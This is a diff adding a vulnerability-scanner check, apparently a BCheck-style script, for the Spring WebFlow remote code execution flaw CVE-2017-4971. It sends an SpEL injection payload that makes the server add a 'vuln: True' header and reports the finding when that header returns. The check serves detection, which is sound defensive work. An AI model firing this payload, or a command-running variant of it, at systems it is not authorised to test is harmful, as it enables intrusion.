@@ -1,0 +1,22 @@
+metadata:
+    language: v1-beta
+    name: "spring_webflow_rce"
+    description: "Spring WebFlow RCE CVE-2017-4971"
+    author: "timeshatter"
+    tags: "Spring WebFlow","CVE-2017-497"
+
+define:
+    payload="&_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(\"vuln\",\"True\").aaa=aaa"
+    answer="vuln=True"
+
+given request then
+    send request called check:
+        appending body:{payload}
+    
+    if {answer} in {check.response} then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "find Spring WebFlow RCE CVE-2017-4971"
+            remediation: "update Spring WebFlow to last."
+    end if
